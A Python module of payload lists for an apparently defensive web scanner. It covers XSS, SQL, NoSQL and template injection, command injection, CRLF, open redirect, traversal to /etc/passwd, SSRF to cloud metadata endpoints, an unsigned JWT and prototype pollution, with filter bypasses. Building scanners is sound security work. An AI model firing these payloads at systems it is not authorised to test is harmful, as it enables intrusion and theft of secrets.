"""
Curated payload collections for Regen scanners.

Sourced from PayloadsAllTheThings (swisskyrepo/PayloadsAllTheThings) and
adapted for safe, non-destructive detection. Each payload is designed to
be identified in the response (canary, error pattern, timing) without
causing data loss or persistent changes.

Depth tiers:
  quick    — 3-5 fast probes for the most common case
  standard — 10-20 payloads covering common filters and DB engines
  full     — 30+ payloads with filter bypasses, encoding tricks, edge cases
"""

CANARY = "rg3n_"

# ---------------------------------------------------------------------------
# XSS payloads — detection via canary reflection
# ---------------------------------------------------------------------------

XSS_QUICK = [
    (f'<script>{CANARY}x1</script>', "basic script tag"),
    (f'"><img src=x onerror="{CANARY}x2">', "attribute breakout img"),
    (f'<svg/onload="{CANARY}x3">', "SVG onload"),
]

XSS_STANDARD = XSS_QUICK + [
    (f"'-alert('{CANARY}x4')-'", "single-quote breakout"),
    (f"javascript:{CANARY}x5", "javascript: URI"),
    (f'<details/open/ontoggle="{CANARY}x6">', "HTML5 details/ontoggle"),
    (f'<input autofocus onfocus="{CANARY}x7">', "HTML5 autofocus"),
    (f'<body onload="{CANARY}x8">', "body onload"),
    (f'<video src=_ onloadstart="{CANARY}x9">', "video onloadstart"),
    (f'<marquee onstart="{CANARY}x10">', "marquee onstart"),
]

XSS_FULL = XSS_STANDARD + [
    # Filter bypass: nested/broken tags
    (f'<scr<script>ipt>{CANARY}x11</scr<script>ipt>', "nested tag bypass"),
    # Filter bypass: entity encoding in attribute
    (f'<img src=x onerror=&#x61;lert("{CANARY}x12")>', "entity-encoded attr"),
    # Filter bypass: javascript with whitespace/control chars
    (f'java%0ascript:alert("{CANARY}x13")', "newline in scheme"),
    (f'java%09script:alert("{CANARY}x14")', "tab in scheme"),
    # Filter bypass: data URI
    (f'<script src="data:;base64,YWxlcnQoMSk="></script>', "data URI script"),
    # Filter bypass: avoiding parentheses
    (f'<svg onload=alert`{CANARY}x16`>', "tagged template literal"),
    # Filter bypass: mixed case
    (f'<IMG SRC=1 ONERROR="{CANARY}x17">', "uppercase tag bypass"),
    # Filter bypass: slash instead of space
    (f'<svg/onload="{CANARY}x18">', "slash-for-space bypass"),
    # SVG CDATA
    (f'<svg><desc><![CDATA[</desc><script>{CANARY}x19</script>]]></svg>', "SVG CDATA"),
    # Mutation XSS (DOMPurify era)
    (f'<noscript><p title="</noscript><img src=x onerror={CANARY}x20>">', "mutation XSS noscript"),
    # fromCharCode bypass
    (f'<img src=x onerror=alert(String.fromCharCode(82,71,51,78))>', "fromCharCode bypass"),
    # Audio tag
    (f'<audio src onloadstart="{CANARY}x22">', "audio onloadstart"),
    # Meter tag
    (f'<meter value=2 min=0 max=10 onmouseover="{CANARY}x23">x</meter>', "meter onmouseover"),
]

XSS_DEPTH = {"quick": XSS_QUICK, "standard": XSS_STANDARD, "full": XSS_FULL}


# ---------------------------------------------------------------------------
# SQL injection payloads — detection via error patterns or timing
# ---------------------------------------------------------------------------

SQLI_QUICK = [
    ("'", "single quote", "error"),
    ("1 OR 1=1--", "boolean tautology", "error"),
    ("' OR '1'='1", "string tautology", "error"),
]

SQLI_STANDARD = SQLI_QUICK + [
    ("1; SELECT 1--", "statement termination", "error"),
    ("' UNION SELECT NULL--", "UNION probe", "error"),
    # MySQL-specific error triggers
    ("' AND EXTRACTVALUE(1,CONCAT('~',version(),'~'))-- -", "MySQL EXTRACTVALUE", "error"),
    ("' AND UPDATEXML(1,CONCAT('.',version()),1)-- -", "MySQL UPDATEXML", "error"),
    # PostgreSQL-specific
    ("' AND 1=CAST('~'||(SELECT version())||'~' AS INT)-- -", "PostgreSQL CAST", "error"),
    # MSSQL-specific
    ("' AND 1=CONVERT(INT,@@version)-- -", "MSSQL CONVERT", "error"),
    # SQLite-specific
    ("' AND CASE WHEN 1=1 THEN 1 ELSE json('') END--", "SQLite CASE/json", "error"),
]

SQLI_FULL = SQLI_STANDARD + [
    # MySQL advanced
    ("' AND GTID_SUBSET(CONCAT('~',version(),'~'),1337)-- -", "MySQL GTID_SUBSET", "error"),
    ("' AND EXP(~(SELECT * FROM (SELECT version())x))-- -", "MySQL EXP overflow", "error"),
    ("' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)-- -", "MySQL GROUP BY", "error"),
    # PostgreSQL advanced
    ("'::int", "PostgreSQL cast shorthand", "error"),
    ("' AND (SELECT version())::int=1-- -", "PostgreSQL inline cast", "error"),
    # MSSQL advanced
    ("' AND 1337 IN (SELECT '~'+@@version+'~')-- -", "MSSQL IN subquery", "error"),
    # Boolean-based (response length differs)
    ("' AND SUBSTR(version(),1,1)='5'--", "MySQL boolean version", "boolean"),
    ("' AND ASCII(LOWER(SUBSTR(version(),1,1)))=51--", "MySQL ASCII boolean", "boolean"),
    ("' AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64--", "MSSQL UNICODE boolean", "boolean"),
    # Time-based (use at full depth only)
    ("' AND SLEEP(3)--", "MySQL SLEEP 3s", "timing"),
    ("'; WAITFOR DELAY '0:0:3'--", "MSSQL WAITFOR 3s", "timing"),
    ("'; SELECT pg_sleep(3)--", "PostgreSQL pg_sleep 3s", "timing"),
    ("' AND 1=LIKE('A',UPPER(HEX(RANDOMBLOB(300000000/2))))--", "SQLite timing BLOB", "timing"),
    # Entry-point characters for broader detection
    ('";', "double-quote semicolon", "error"),
    ("';", "single-quote semicolon", "error"),
    ("1*56", "numeric multiplication", "error"),
]

SQLI_DEPTH = {"quick": SQLI_QUICK, "standard": SQLI_STANDARD, "full": SQLI_FULL}

SQLI_ERROR_PATTERNS = [
    # MySQL
    (r"you have an error in your sql syntax", "MySQL"),
    (r"mysql_fetch|mysql_num_rows|mysql_query", "MySQL"),
    (r"SQLSTATE\[", "PDO/generic"),
    # PostgreSQL
    (r"pg_query|pg_exec|PG::SyntaxError", "PostgreSQL"),
    (r"syntax error at or near", "PostgreSQL"),
    (r"unterminated string literal", "PostgreSQL"),
    (r"invalid input syntax for (type |integer)", "PostgreSQL"),
    # MSSQL
    (r"unclosed quotation mark", "MSSQL"),
    (r"microsoft ole db provider for sql", "MSSQL"),
    (r"microsoft sql native client", "MSSQL"),
    (r"incorrect syntax near", "MSSQL"),
    # SQLite
    (r"sqlite3\.OperationalError", "SQLite"),
    (r"unrecognized token", "SQLite"),
    (r"near \".*?\": syntax error", "SQLite"),
    # Oracle
    (r"ORA-\d{5}", "Oracle"),
    (r"quoted string not properly terminated", "Oracle"),
    # Generic
    (r"jet database engine", "MS Access"),
    (r"ODBC SQL Server Driver", "ODBC/MSSQL"),
    (r"SQL syntax.*?MySQL", "MySQL"),
    (r"Warning.*?mysql_", "MySQL/PHP"),
    (r"Warning.*?pg_", "PostgreSQL/PHP"),
]


# ---------------------------------------------------------------------------
# SSTI payloads — detection via evaluated arithmetic
# ---------------------------------------------------------------------------

SSTI_QUICK = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${7*7}", "49", "Freemarker/Velocity"),
    ("<%= 7*7 %>", "49", "ERB/EJS"),
]

SSTI_STANDARD = SSTI_QUICK + [
    ("#{7*7}", "49", "Ruby/Java EL"),
    ("{{7*'7'}}", "7777777", "Jinja2 (string repeat)"),
    ("${T(java.lang.Math).PI}", "3.14", "Spring EL"),
    ("{{constructor.constructor('return 7*7')()}}", "49", "Prototype chain (Pug/Jade)"),
    ("{php}echo 7*7;{/php}", "49", "Smarty"),
]

SSTI_FULL = SSTI_STANDARD + [
    ("{{config}}", "SECRET_KEY", "Flask config leak"),
    ("{{settings.SECRET_KEY}}", "SECRET_KEY", "Django settings leak"),
    ("${7*7}", "49", "Mako/Velocity"),
    ("@(7*7)", "49", "Razor"),
    ("{{self}}", "TemplateReference", "Jinja2 self leak"),
    ("{{request}}", "Request", "Jinja2 request leak"),
    ("#set($x=7*7)$x", "49", "Velocity #set"),
    ("*{7*7}", "49", "Thymeleaf"),
]

SSTI_DEPTH = {"quick": SSTI_QUICK, "standard": SSTI_STANDARD, "full": SSTI_FULL}


# ---------------------------------------------------------------------------
# CRLF / header injection payloads
# ---------------------------------------------------------------------------

CRLF_STANDARD = [
    ("%0d%0aX-Regen-Injected: true", "URL-encoded CRLF"),
    ("%0aX-Regen-Injected: true", "LF only"),
    ("\r\nX-Regen-Injected: true", "raw CRLF"),
]

CRLF_FULL = CRLF_STANDARD + [
    ("%0d%0a%0d%0a<script>rg3n</script>", "CRLF + body injection"),
    ("%E5%98%8D%E5%98%8AX-Regen: true", "Unicode CRLF (UTF-8 overlong)"),
    ("%00%0d%0aX-Regen: true", "null byte + CRLF"),
]


# ---------------------------------------------------------------------------
# Command injection payloads — timing-based detection
# ---------------------------------------------------------------------------

CMDI_STANDARD = [
    ("; sleep 3 #", "semicolon-sleep"),
    ("| sleep 3 #", "pipe-sleep"),
    ("$(sleep 3)", "subshell-sleep"),
    ("`sleep 3`", "backtick-sleep"),
]

CMDI_FULL = CMDI_STANDARD + [
    ("& sleep 3 &", "background-sleep"),
    ("|| sleep 3", "or-sleep"),
    ("&& sleep 3", "and-sleep"),
    ("%0asleep 3", "newline-sleep"),
    # Windows variants
    ("& timeout /T 3", "Windows timeout"),
    ("| timeout /T 3", "Windows pipe-timeout"),
    # Bypass filters
    ("s]l]e]e]p 3", "bracket-bypass (bash)"),
    ("$({s]leep,3})", "brace expansion bypass"),
]


# ---------------------------------------------------------------------------
# Open redirect payloads
# ---------------------------------------------------------------------------

REDIRECT_STANDARD = [
    "https://evil.example.com",
    "//evil.example.com",
    "/\\evil.example.com",
    "https://evil.example.com%2f.example.com",
]

REDIRECT_FULL = REDIRECT_STANDARD + [
    "https://evil.example.com@legitimate.com",
    "https://legitimate.com.evil.example.com",
    "/\t/evil.example.com",
    "/%09/evil.example.com",
    "///evil.example.com",
    "////evil.example.com",
    "https:evil.example.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]


# ---------------------------------------------------------------------------
# Path traversal payloads
# ---------------------------------------------------------------------------

TRAVERSAL_STANDARD = [
    ("../../../etc/passwd", "classic traversal"),
    ("..%2f..%2f..%2fetc%2fpasswd", "URL-encoded traversal"),
    ("....//....//....//etc/passwd", "double-dot bypass"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "fully encoded"),
]

TRAVERSAL_FULL = TRAVERSAL_STANDARD + [
    ("..%252f..%252f..%252fetc/passwd", "double URL-encoded"),
    ("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "UTF-8 overlong"),
    ("..\\..\\..\\etc\\passwd", "backslash traversal"),
    ("..%5c..%5c..%5cetc%5cpasswd", "encoded backslash"),
    (".../.../.../etc/passwd", "triple-dot variant"),
    ("....\\....\\....\\etc\\passwd", "Windows double-dot"),
    ("%00../../etc/passwd", "null byte prefix"),
    ("../../../etc/passwd%00.jpg", "null byte suffix"),
    ("..%c0%af..%c0%af..%c0%afetc/passwd", "IIS Unicode"),
]


# ---------------------------------------------------------------------------
# SSRF payloads — detection via response content or timing
# ---------------------------------------------------------------------------

SSRF_INTERNAL_TARGETS = [
    ("http://127.0.0.1/", "IPv4 loopback"),
    ("http://localhost/", "localhost"),
    ("http://[::1]/", "IPv6 loopback"),
    ("http://0.0.0.0/", "unspecified address"),
    ("http://0x7f000001/", "hex IP loopback"),
    ("http://2130706433/", "decimal IP loopback"),
    ("http://017700000001/", "octal IP loopback"),
]

SSRF_CLOUD_METADATA = [
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
    ("http://169.254.169.254/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba metadata"),
]

SSRF_BYPASS = [
    ("http://127.1/", "shortened loopback"),
    ("http://0/", "zero IP"),
    ("http://127.0.0.1.nip.io/", "DNS rebinding via nip.io"),
    ("http://spoofed.burpcollaborator.net/", "DNS rebinding concept"),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]/", "IPv6-mapped IPv4"),
]


# ---------------------------------------------------------------------------
# NoSQL injection payloads
# ---------------------------------------------------------------------------

NOSQL_PAYLOADS = [
    # MongoDB operator injection (JSON body)
    ({"$gt": ""}, "MongoDB $gt operator"),
    ({"$ne": ""}, "MongoDB $ne operator"),
    ({"$regex": ".*"}, "MongoDB $regex wildcard"),
    ({"$where": "1==1"}, "MongoDB $where JS"),
    ({"$exists": True}, "MongoDB $exists"),
]

NOSQL_STRING_PAYLOADS = [
    ("' || '1'=='1", "JS string tautology"),
    ("';return true;var a='", "JS return injection"),
    ('{"$gt":""}', "JSON operator in string param"),
    ('{"$ne":""}', "JSON $ne in string param"),
    ("true, $where: '1 == 1'", "MongoDB $where in string"),
]


# ---------------------------------------------------------------------------
# GraphQL payloads
# ---------------------------------------------------------------------------

GRAPHQL_INTROSPECTION = '{"query":"{__schema{types{name fields{name}}}}"}'

GRAPHQL_PROBES = [
    ('{"query":"{__typename}"}', "type name leak"),
    ('{"query":"{ __schema { queryType { name } } }"}', "schema query type"),
    ('{"query":"{ __schema { mutationType { name } } }"}', "schema mutation type"),
    ('{"query":"{ __schema { types { name kind } } }"}', "all types"),
    ('{"query":"query{__schema{directives{name}}}"}', "directives"),
]


# ---------------------------------------------------------------------------
# JWT (JSON Web Token) payloads
# ---------------------------------------------------------------------------

JWT_NONE_ALG = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9."

JWT_CHECKS = [
    "none-algorithm",
    "empty-signature",
    "expired-token-acceptance",
    "algorithm-confusion",
]


# ---------------------------------------------------------------------------
# Prototype pollution payloads (for API fuzzing)
# ---------------------------------------------------------------------------

PROTO_POLLUTION = [
    {"__proto__": {"isAdmin": True}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    {"__proto__": {"polluted": "rg3n_proto"}},
    {"constructor.prototype.polluted": "rg3n_proto"},
]


# ---------------------------------------------------------------------------
# Parameter names to test across scanners
# ---------------------------------------------------------------------------

INJECT_PARAMS = [
    "q", "search", "query", "s", "id", "page", "redirect",
    "url", "next", "callback", "name", "file", "path",
    "template", "view", "action", "type", "category",
]

REDIRECT_PARAMS = [
    "redirect", "next", "url", "return", "returnTo",
    "goto", "continue", "dest", "destination", "rurl",
    "redirect_uri", "redirect_url", "forward", "target",
]
